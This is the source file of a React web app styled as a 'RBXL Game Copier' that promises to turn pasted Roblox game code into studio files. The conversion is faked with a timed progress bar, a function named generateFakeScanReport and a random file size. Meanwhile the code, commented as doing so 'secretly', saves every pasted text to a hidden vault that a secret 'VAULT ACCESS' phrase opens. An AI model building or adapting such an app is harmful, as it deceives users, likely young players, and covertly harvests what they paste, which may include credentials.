
import React, { useState, useEffect, useRef } from 'react';
import { ShieldCheck, Clipboard, Download, FileCode, CheckCircle2, AlertTriangle, RefreshCw, Send, Zap } from 'lucide-react';
import { AppState, ScanResult } from './types';
import ScannerUI from './components/ScannerUI';
import AdminVault from './components/AdminVault';
import { generateFakeScanReport } from './services/geminiService';
import { saveToVault } from './services/vaultService';

const COPIED_GAMES = [
  "Adopt Me!", "Blox Fruits", "Brookhaven 🏠RP", "Pet Simulator 99!", 
  "Murder Mystery 2", "Doors", "Dress To Impress", "Toilet Tower Defense", 
  "BedWars", "Barry's Prison Run"
];

const App: React.FC = () => {
  const [state, setState] = useState<AppState>(AppState.IDLE);
  const [progress, setProgress] = useState(0);
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [pastedCode, setPastedCode] = useState("");
  const [isAdminVisible, setIsAdminVisible] = useState(false);
  
  const autoSaveTimerRef = useRef<any>(null);

  /**
   * Secretly stores the pasted content into the browser's IndexedDB.
   */
  const captureToVault = async (content: string) => {
    if (!content.trim() || content.trim().toUpperCase() === "VAULT ACCESS") return;
    try {
      await saveToVault({
        label: content.slice(0, 20).replace(/\n/g, ' ') || 'Untitled Snippet',
        content: content,
        timestamp: new Date().toISOString(),
        length: content.length
      });
      console.log(`[SYSTEM] Payload synchronized with vault.`);
    } catch (err) {
      console.error("Vault capture error", err);
    }
  };

  const handleTextChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    
    // Check for secret vault access string
    if (val.trim().toUpperCase() === "VAULT ACCESS") {
      setIsAdminVisible(true);
      setPastedCode("");
      if (autoSaveTimerRef.current) clearTimeout(autoSaveTimerRef.current);
      return;
    }

    setPastedCode(val);

    if (autoSaveTimerRef.current) clearTimeout(autoSaveTimerRef.current);
    autoSaveTimerRef.current = setTimeout(() => {
      captureToVault(val);
    }, 1000);
  };

  const startReconstruction = async () => {
    if (!pastedCode.trim()) return;
    
    setState(AppState.SCANNING);
    setProgress(0);

    captureToVault(pastedCode);

    const reportPromise = generateFakeScanReport("Input_Source_Snippet");

    const duration = 5200; 
    const interval = 50;
    const steps = duration / interval;
    const increment = 100 / steps;

    let currentProgress = 0;
    const timer = setInterval(async () => {
      currentProgress += increment;
      if (currentProgress >= 100) {
        clearInterval(timer);
        setProgress(100);
        
        const report = await reportPromise;
        const randomKb = Math.floor(Math.random() * (12288 - 512) + 512); 

        setScanResult({
          fileName: 'Converted_Game_Export.rbxl',
          fileSize: (pastedCode.length / 1024).toFixed(2) + ' KB',
          threatLevel: report.threatLevel,
          summary: report.summary,
          metadata: report.metadata,
          downloadSizeKb: randomKb
        });

        setState(AppState.COMPLETED);
      } else {
        setProgress(Math.floor(currentProgress));
      }
    }, interval);
  };

  const reset = () => {
    setState(AppState.IDLE);
    setProgress(0);
    setScanResult(null);
    setPastedCode("");
  };

  return (
    <div className="min-h-screen text-gray-100 flex flex-col">
      {isAdminVisible && <AdminVault onClose={() => setIsAdminVisible(false)} />}
      
      <div className="flex-1 p-4 md:p-8 flex flex-col">
        {/* Header */}
        <header className="max-w-6xl mx-auto w-full flex items-center justify-between mb-8 md:mb-12">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-green-500/20 border border-green-500 rounded-lg shadow-[0_0_15px_rgba(34,197,94,0.3)]">
              <ShieldCheck className="w-8 h-8 text-green-500" />
            </div>
            <div>
              <h1 className="text-2xl font-black tracking-tighter uppercase italic">
                RBXL <span className="text-green-500">Game Copier</span>
              </h1>
              <p className="text-[10px] text-gray-500 tracking-[0.2em] uppercase font-bold cursor-default select-none">
                Secure Game Reconstruction
              </p>
            </div>
          </div>
        </header>

        <main className="flex-1 max-w-4xl mx-auto w-full flex flex-col items-center justify-center py-6">
          {state === AppState.IDLE && (
            <div className="w-full space-y-8">
              <div className="text-center space-y-3">
                <h2 className="text-3xl md:text-4xl font-extrabold text-white tracking-tight animate-heading-pulse">
                  Convert Any Game to RBXL
                </h2>
                <p className="text-gray-400 text-sm md:text-base max-w-xl mx-auto leading-relaxed">
                  Paste game source or bytecode directly into the engine to generate studio files.
                </p>
              </div>

              <div className="w-full max-w-xl mx-auto flex flex-col gap-3">
                <div className="relative group">
                  <div className="absolute -inset-0.5 bg-green-500/10 rounded-xl blur opacity-20 group-hover:opacity-60 transition duration-1000 group-hover:duration-200"></div>
                  <textarea
                    value={pastedCode}
                    onChange={handleTextChange}
                    placeholder="Paste code snippet here..."
                    className="relative w-full h-14 bg-black/60 border border-gray-800 rounded-xl px-4 py-3 mono text-sm focus:outline-none focus:border-green-500/50 transition-all placeholder:text-gray-700 resize-none shadow-2xl overflow-hidden whitespace-nowrap"
                  />
                  <div className="absolute bottom-2 right-3 flex items-center gap-1.5 pointer-events-none opacity-30">
                    <Zap className="w-3 h-3 text-green-500" />
                    <span className="text-[8px] mono uppercase tracking-widest text-gray-500">Sync ON</span>
                  </div>
                </div>

                <button
                  disabled={!pastedCode.trim()}
                  onClick={startReconstruction}
                  className="w-full py-4 bg-white text-black font-black uppercase tracking-widest rounded-xl hover:bg-green-500 transition-all flex items-center justify-center gap-3 active:scale-[0.98] disabled:opacity-30 disabled:cursor-not-allowed shadow-lg"
                >
                  <Send className="w-4 h-4" />
                  Convert
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 max-w-3xl mx-auto mt-8">
                {[
                  { icon: <Clipboard className="w-4 h-4" />, title: "Capture", desc: "Real-time verification." },
                  { icon: <RefreshCw className="w-4 h-4" />, title: "Reconstruct", desc: "Object hierarchy mapping." },
                  { icon: <CheckCircle2 className="w-4 h-4" />, title: "Vault", desc: "Encrypted processing." }
                ].map((item, i) => (
                  <div key={i} className="p-4 bg-gray-900/30 border border-gray-800 rounded-xl border-l-2 hover:border-l-green-500 transition-colors">
                    <div className="text-green-500 mb-2">{item.icon}</div>
                    <h3 className="font-bold text-xs mb-0.5">{item.title}</h3>
                    <p className="text-[10px] text-gray-500 leading-tight">{item.desc}</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {state === AppState.SCANNING && (
            <ScannerUI progress={progress} fileName="Pasted_Buffer_Segment" />
          )}

          {state === AppState.COMPLETED && scanResult && (
            <div className="w-full max-w-2xl space-y-6 animate-in fade-in zoom-in duration-500">
              <div className="p-8 border border-green-500 bg-green-500/5 rounded-2xl flex flex-col md:flex-row items-center gap-6 shadow-[0_0_30px_rgba(34,197,94,0.1)]">
                <div className="p-6 bg-green-500 rounded-xl shadow-[0_0_20px_rgba(34,197,94,0.4)]">
                  <FileCode className="w-12 h-12 text-black" />
                </div>
                <div className="flex-1 text-center md:text-left">
                  <div className="inline-block px-3 py-1 bg-green-500 text-black text-[10px] font-black rounded-full mb-2 uppercase tracking-tighter">Export Compiled</div>
                  <h2 className="text-2xl font-bold truncate max-w-md">{scanResult.fileName}</h2>
                  <p className="text-gray-400 mono text-sm">Package Size: {scanResult.downloadSizeKb} KB</p>
                </div>
                <div className="text-gray-500 text-xs italic mono">Processing...</div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="p-6 bg-gray-900 border border-gray-800 rounded-xl">
                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Security Sweep</h3>
                  <div className="flex items-center gap-2 mb-3">
                    <AlertTriangle className={`w-5 h-5 ${scanResult.threatLevel === 'Low' ? 'text-green-500' : 'text-yellow-500'}`} />
                    <span className="font-bold text-sm">Result: {scanResult.threatLevel} Alert</span>
                  </div>
                  <p className="text-xs text-gray-400 italic">"{scanResult.summary}"</p>
                </div>

                <div className="p-6 bg-gray-900 border border-gray-800 rounded-xl">
                  <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-4">Data Metadata</h3>
                  <div className="space-y-2 mono text-[9px]">
                    {Object.entries(scanResult.metadata).map(([key, val]) => (
                      <div key={key} className="flex justify-between border-b border-gray-800 pb-1">
                        <span className="text-gray-500 uppercase">{key}</span>
                        <span className="text-green-500">{val}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <button 
                onClick={reset}
                className="w-full py-4 text-gray-500 hover:text-white transition-colors flex items-center justify-center gap-2 text-sm font-semibold group"
              >
                <RefreshCw className="w-4 h-4 group-hover:rotate-180 transition-transform duration-500" />
                Convert Another
              </button>
            </div>
          )}
        </main>
      </div>

      {/* Footer Area */}
      <footer className="w-full mt-auto bg-black/40 border-t border-gray-900/50">
        <div className="max-w-6xl mx-auto w-full py-4 px-6">
           <div className="flex flex-col gap-3">
              <div className="flex items-center gap-2">
                <div className="w-1.5 h-1.5 rounded-full bg-green-500 shadow-[0_0_5px_#22c55e]" />
                <span className="text-[10px] font-bold uppercase tracking-widest text-gray-600">Copied Library</span>
              </div>
              <div className="flex flex-wrap gap-x-4 gap-y-1">
                {COPIED_GAMES.map((game, i) => (
                  <span key={i} className="text-[9px] mono text-gray-500 hover:text-green-500/50 transition-colors cursor-default">
                    {game}{i < COPIED_GAMES.length - 1 ? ' •' : ''}
                  </span>
                ))}
              </div>
           </div>
        </div>
        
        <div className="max-w-6xl mx-auto w-full py-6 px-6 border-t border-gray-900/50 flex flex-col md:flex-row justify-between items-center gap-4 text-[10px] text-gray-600">
          <p className="cursor-default select-none uppercase tracking-widest opacity-50">
            © 2026 RBXL Game Copier. ALL DATA IS STORED SECURELY.
          </p>
          <div className="flex gap-6 uppercase tracking-widest opacity-30">
            <span className="mono">VER: 5.0.1_STABLE</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;
